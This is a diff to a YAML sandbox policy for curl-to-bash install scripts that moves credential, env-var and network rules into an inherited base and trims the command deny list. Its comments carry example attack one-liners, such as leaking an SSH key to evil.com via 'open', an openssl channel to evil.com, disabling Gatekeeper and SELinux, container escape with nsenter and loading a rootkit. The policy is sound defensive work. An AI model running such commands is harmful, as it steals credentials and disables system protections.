@@ -1,4 +1,5 @@
 version: 1
+includes: [base]
 
 # Auto-policy for bash/sh install scripts (curl ... | bash)
 # Customise: ~/.config/malwi/policies/bash-install.yaml
@@ -10,6 +11,9 @@ version: 1
 # Key difference from the default policy: curl/wget are ALLOWED because
 # install scripts legitimately download files. Protection is provided by
 # file/envvar/network restrictions and blocking dangerous tools.
+#
+# Inherits from base: envvars, symbols, network deny/warn.
+# Extra file protections (shell profiles, persistence dirs, browser data).
 
 # Allow download tools and common install utilities.
 # Deny interpreters, persistence, privilege escalation, obfuscation,
@@ -91,7 +95,7 @@ commands:
     - sw_vers
     - lsb_release
     - dpkg-architecture
-    # Process control
+    # Process control (harmless)
     - "true"
     - "false"
     - test
@@ -155,72 +159,12 @@ commands:
     - security
     # File access bypass via if=/of= args
     - dd
-    # Scripting interpreters — can execute arbitrary code, bypassing traced process
-    - osascript    # AppleScript/JXA: shell access, file I/O, network via scripting bridge
-    - swift        # Swift interpreter: full system access
-    - java         # JVM: arbitrary code execution, network I/O
-    # Data exfiltration — can leak sensitive data without network hooks seeing it
-    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat ~/.ssh/id_rsa)"
-    - sqlite3      # queries browser credential DBs (Chrome Login Data, Safari, etc.)
-    - ditto        # bulk file copy: ditto ~/.ssh /tmp/exfil
-    - zip          # bulk archival: zip -r /tmp/x.zip ~/.aws
-    - rsync        # bidirectional file sync, can exfil over SSH
-    # Credential/config readers — read secrets from macOS system stores
-    - plutil       # reads plist files: app tokens, Safari data, stored credentials
-    - defaults     # reads macOS preferences: OAuth tokens, login items, app secrets
+    # Data exfiltration / staging
+    - ditto          # bulk file copy (macOS)
+    - zip            # bulk archival
+    - rsync          # bidirectional file sync, can exfil over SSH
     # Encrypted channels — can establish C2 bypassing network hooks
-    - openssl      # openssl s_client -connect evil.com:443
-    # Reconnaissance — locates credential files on disk
-    - mdfind       # Spotlight search: mdfind "kMDItemFSName == '*.pem'"
-    - mdls         # Spotlight metadata: reveals file locations and attributes
-    # Security bypass — disables macOS protections
-    - xattr        # removes quarantine flags: xattr -d com.apple.quarantine malware
-    - codesign     # re-signs modified binaries to bypass integrity checks
-    - spctl        # disables Gatekeeper: spctl --master-disable
-    - hdiutil      # mounts/creates disk images for data staging
-    # Linux scripting interpreters (L1) — arbitrary code bypassing traced process
-    - gjs          # GNOME JavaScript: D-Bus, file, network via GLib/Gio
-    - dbus-send    # D-Bus messages: invoke polkit, systemd, NetworkManager
-    - gdbus        # GLib D-Bus: read GNOME Keyring, control services
-    - busctl       # systemd D-Bus: start/stop/enable services
-    # Linux data exfiltration (L2)
-    - xdg-open     # opens URLs in browser bypassing network hooks
-    - wl-copy      # Wayland clipboard write: cat creds | wl-copy
-    - wl-paste     # Wayland clipboard read: access previously copied secrets
-    # Linux credential readers (L3) — access desktop keyring stores
-    - secret-tool  # GNOME Keyring: secret-tool lookup service github
-    - kwallet-query  # KDE Wallet: kwallet-query -r entry kdewallet
-    - kwalletcli   # KDE Wallet CLI (alternative)
-    - keyctl       # kernel keyring: keyctl read <key-id>
-    - pass         # password-store: pass show email/gmail
-    # Linux reconnaissance (L4) — pre-indexed file search
-    - locate       # locate '*.pem' finds all credential files instantly
-    - mlocate      # alternative locate implementation
-    - plocate      # modern locate implementation
-    # Linux security bypass (L5) — disable protections, escape isolation
-    - setenforce   # disable SELinux: setenforce 0
-    - aa-disable   # disable AppArmor: aa-disable /usr/bin/target
-    - apparmor_parser  # remove AppArmor profile: apparmor_parser -R
-    - chattr       # remove immutable flag: chattr -i /etc/passwd
-    - setcap       # set capabilities: setcap cap_net_raw+ep binary
-    - debugfs      # raw ext2/3/4 access, bypasses ALL permissions
-    - chroot       # change root filesystem, escape containers
-    - unshare      # create namespaces: bypass network/PID isolation
-    - nsenter      # enter namespaces: nsenter -t 1 -m -p (container escape)
-    - mount        # mount attacker NFS/CIFS, bind-mount escape
-    # Kernel/module manipulation (L6) — rootkit installation
-    - insmod       # load kernel module: insmod rootkit.ko
-    - modprobe     # load module by name (resolves dependencies)
-    - rmmod        # remove module: rmmod apparmor disables MAC
-    - kexec        # load new kernel, bypass secure boot
-    # Process memory/injection (L7) — dump credentials via ptrace
-    - strace       # trace syscalls: strace -e read -p <pid>
-    - ltrace       # trace library calls, captures arguments
-    - gdb          # attach to process, inject code, dump memory
-    - gcore        # dump process core: gcore <pid>
-    # Linux privilege escalation (L9)
-    - pkexec       # PolicyKit: pkexec bash (CVE-2021-4034 PwnKit)
-
+    - openssl        # openssl s_client -connect evil.com:443
   warn:
     # eval is common but dangerous
     - eval
@@ -242,24 +186,12 @@ commands:
     - su
     - doas
 
-# Protect credentials, shell profiles, persistence dirs, and system files.
+# Extra file protections beyond base (shell profiles, persistence, browser, proc).
+# Base already provides: credentials (~/.ssh, ~/.aws, *.pem, etc.),
+# Linux keyrings, autostart dirs, ld.so.preload.
 files:
   deny:
-    # Credentials (S2.1)
-    - "~/.ssh/**"
-    - "*/.ssh/**"
-    - "~/.aws/**"
-    - "*/.aws/**"
-    - "~/.config/gcloud/**"
-    - "~/.azure/**"
-    - "~/.gnupg/**"
-    - "~/.config/gh/**"
-    - "*/.kube/config"
-    - "*.pem"
-    - "*.key"
-    - "*id_rsa*"
-    - "*id_ed25519*"
-    # Shell profiles (S3.1)
+    # Shell profiles (S3.1) — attackers modify for persistence
     - "~/.bashrc"
     - "~/.bash_profile"
     - "~/.zshrc"
@@ -271,83 +203,30 @@ files:
     - "~/Library/LaunchDaemons/*"
     - "/etc/cron*"
     - "/etc/systemd/**"
-    # Git hooks (S3.3)
+    # Git hooks (S3.3) — hidden persistence via hook scripts
     - ".git/hooks/*"
     - "*/.git/hooks/*"
     # System files
     - "/etc/passwd"
     - "/etc/shadow"
-    # Browser data (S2.1)
+    # Browser data (S2.1) — credential databases
     - "*/Google/Chrome/**"
     - "*/Firefox/**"
     - "*/Safari/**"
-    # Shared memory (S5.3)
+    # Shared memory (S5.3) — fileless staging
     - "/dev/shm/*"
-    # Linux credential stores (L3)
-    - "~/.local/share/keyrings/**"     # GNOME Keyring files
-    - "~/.local/share/kwalletd/**"     # KDE Wallet files
     # Linux persistence (L8)
-    - "~/.config/autostart/**"         # XDG autostart entries
-    - "~/.config/systemd/user/**"      # systemd user services
-    - "/etc/udev/rules.d/**"           # udev rules (persistence via device events)
-    - "/etc/init.d/**"                 # SysV init scripts
-    - "/var/spool/cron/**"             # cron spool directory
-    - "/etc/ld.so.preload"             # system-wide preload (rootkit)
-    - "/etc/ld.so.conf"                # library search paths (hijack)
-    - "/etc/ld.so.conf.d/**"           # library search path fragments
+    - "/etc/udev/rules.d/**"       # udev rules (persistence via device events)
+    - "/etc/init.d/**"             # SysV init scripts
+    - "/var/spool/cron/**"         # cron spool directory
+    - "/etc/ld.so.conf"            # library search paths (hijack)
+    - "/etc/ld.so.conf.d/**"       # library search path fragments
     # Process information (credential dumping)
-    - "/proc/*/environ"                # other processes' env vars (secrets)
-    - "/proc/*/maps"                   # process memory maps (aids dumping)
-    - "/proc/*/mem"                    # raw process memory (credential extraction)
+    - "/proc/*/environ"            # other processes' env vars (secrets)
+    - "/proc/*/maps"               # process memory maps (aids dumping)
+    - "/proc/*/mem"                # raw process memory (credential extraction)
 
-# Protect sensitive environment variables from exfiltration.
-envvars:
-  deny:
-    # Secret patterns (S2.2)
-    - "*SECRET*"
-    - "*TOKEN*"
-    - "*PASSWORD*"
-    - "*API_KEY*"
-    - "*PRIVATE_KEY*"
-    # Cloud provider prefixes
-    - "AWS_*"
-    - "GITHUB_*"
-    - "GCP_*"
-    - "AZURE_*"
-    - "OPENAI_*"
-    - "ANTHROPIC_*"
-    - HF_TOKEN
-    # Anti-tracing (S8.2)
-    - DYLD_INSERT_LIBRARIES
-    - LD_PRELOAD
-
-# Block credential-interception, filesystem bypass, and raw networking functions.
-symbols:
-  deny:
-    # Credential interception
-    - getpass
-    - crypt
-    # Symlink/hardlink creation (bypass file path patterns)
-    - symlink
-    - link
-    # Direct syscall wrapper (prevents SYS_openat bypass of open() hooks)
-    - syscall
-    # Raw networking — catches bash /dev/tcp, /dev/udp
-    - connect
-    - socket
-    - sendto
-    - bind
-
-# Restrict to HTTP/HTTPS protocols only.
-# Block cloud metadata endpoints (SSRF protection).
-# Warn on suspicious TLDs and anonymity networks.
+# Restrict to HTTP/HTTPS protocols only (no raw TCP/UDP/WebSocket).
+# Base provides cloud metadata deny + anonymity domain warnings.
 network:
   protocols: [https, http]
-  deny:
-    - "169.254.169.254/**"
-    - "metadata.google.internal/**"
-  warn:
-    - "*.onion"
-    - "*.i2p"
-    - "*.bit"
-    - "*.loki"
